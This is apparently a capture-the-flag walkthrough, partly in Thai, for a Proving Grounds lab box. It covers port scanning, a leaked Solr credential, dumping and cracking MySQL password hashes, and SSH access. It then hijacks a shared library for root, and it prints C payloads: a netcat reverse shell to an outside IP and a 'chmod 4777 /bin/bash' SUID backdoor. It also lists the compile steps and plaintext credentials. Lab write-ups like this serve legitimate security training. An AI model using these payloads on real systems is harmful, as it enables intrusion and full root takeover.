
# Recon 
## TCP Scan
```bash
sudo ../Tools/scan.sh  192.168.175.205
[sudo] password for kali: 
[*] Running rustscan...
[*] Running nmap on ports: 22,3306,8983
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-25 09:35 +07
Nmap scan report for 192.168.175.205
Host is up (0.036s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f2:5a:a9:66:65:3e:d0:b8:9d:a5:16:8c:e8:16:37:e2 (ECDSA)
|_  256 9b:2d:1d:f8:13:74:ce:96:82:4e:19:35:f9:7e:1b:68 (ED25519)
3306/tcp open  mysql   MySQL 8.0.41-0ubuntu0.24.04.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=MySQL_Server_8.0.41_Auto_Generated_Server_Certificate
| Not valid before: 2025-02-17T15:27:47
|_Not valid after:  2035-02-15T15:27:47
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.41-0ubuntu0.24.04.1
|   Thread ID: 12
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, SupportsTransactions, ODBCClient, Speaks41ProtocolOld, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, SupportsCompression, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, IgnoreSigpipes, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, InteractiveClient, LongColumnFlag, LongPassword, FoundRows, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: ;\x19iKIZ%gCWf{Cm^xS\x0FV\x1A
|_  Auth Plugin Name: caching_sha2_password
8983/tcp open  http    Jetty
| http-title: Solr Admin
|_Requested resource was /solr/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.54 seconds

```

## TCP 8983

![[Challenge/ProvingGround/dev_working/IMG/001.png]]

จากการตรวจสอบใน Exploit จะเห็นว่าไม่มี Exploit ใดสามารถใช้งานได้ 

![[Challenge/ProvingGround/dev_working/IMG/002.png]]

จากการตรวจสอบทำให้พบ Credential Leak  `slv01:nBk3c4gj0J`
# Enum MySQL 

```bash
mysql -u slv01 -p  -h 192.168.138.205 -P 3306 --skip-ssl-verify-server-cert
```
![[Challenge/ProvingGround/dev_working/IMG/003.png]]

```sql
MySQL [(none)]> select version();
+-------------------------+
| version()               |
+-------------------------+
| 8.0.41-0ubuntu0.24.04.1 |
+-------------------------+
1 row in set (0.037 sec)

MySQL [(none)]>  select system_user();
+----------------------+
| system_user()        |
+----------------------+
| slv01@192.168.45.161 |
+----------------------+
1 row in set (0.043 sec)

MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev01              |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.052 sec)

MySQL [(none)]> show tables;
ERROR 1046 (3D000): No database selected
MySQL [(none)]> use dev01
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [dev01]> show tables;
+-----------------+
| Tables_in_dev01 |
+-----------------+
| Users           |
+-----------------+
1 row in set (0.045 sec)

MySQL [dev01]> select * from Users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | root     | B3B72B283F43DC8302F73E94245F4D4D |
|  2 | bob      | 22958710C569D1FA791F43ABA4D4E9EA |
+----+----------+----------------------------------+
2 rows in set (1.912 sec)

MySQL [dev01]> 

```
# Crack md5 hash


![[Challenge/ProvingGround/dev_working/IMG/004.png]]

จากข้อมูลจะได้ข้อมูลของ bob:sunflower 

# Shell as bob

```bash
ssh bob@192.168.138.205  
```

# Host check 

![[Challenge/ProvingGround/dev_working/IMG/006.png]]

![[Challenge/ProvingGround/dev_working/IMG/005.png]]


```pass
B4cup32M4n4age
```

จากข้อมูลข้างต้นจะพบว่ารหัสผ่านและมีการเรียกใช้ lib_backup.so ซึ่งหมายความว่าเราอาจจะสามารถ Injecy ไฟล์ .so ได้ 

# .so file reverse shell

Reverse shell .so file
```c
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>  
#include <unistd.h>  
  
static void revShell() __attribute__((constructor));  
  
void revShell() {  
setuid(0);  
setgid(0);  
printf("Reverse Shell via library hijacking. \n");  
const char *ncshell = "nc -e /bin/sh 192.168.45.161 443 &";  
system(ncshell);  
}
```

ข้างต้นไม่สามารถทำ Reverse Shell ได้ ให้ทดสอบเปลี่ยนสิทธิของ /bin/bash เป็น 777 

```c
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>  
#include <unistd.h>  
  
static void advance_backup_custom_implementation() __attribute__((constructor));  
  
void advance_backup_custom_implementation() {  
setuid(0);  
setgid(0);  
printf("Reverse Shell via library hijacking... \n");  
system("chmod 4777 /bin/bash");  
}
```

```bash
bob@dev01:/tmp$ cat lib_backup.c 
#include <stdio.h>  
#include <stdlib.h>  
#include <sys/types.h>  
#include <unistd.h>  
  
static void advance_backup_custom_implementation() __attribute__((constructor));  
  
void advance_backup_custom_implementation() {  
 setuid(0);  
 setgid(0);  
 printf("Reverse Shell via library hijacking... \n");  
 system("chmod 4777 /bin/bash");  
}
bob@dev01:/tmp$ 


# Complire 
bob@dev01:/tmp$ gcc -Wall -fPIC -c lib_backup.c -o lib_backup.o
bob@dev01:/tmp$ gcc -shared lib_backup.o -o lib_backup.so   
```

# Shell as root

![[Challenge/ProvingGround/dev_working/IMG/007.png]]

# PWN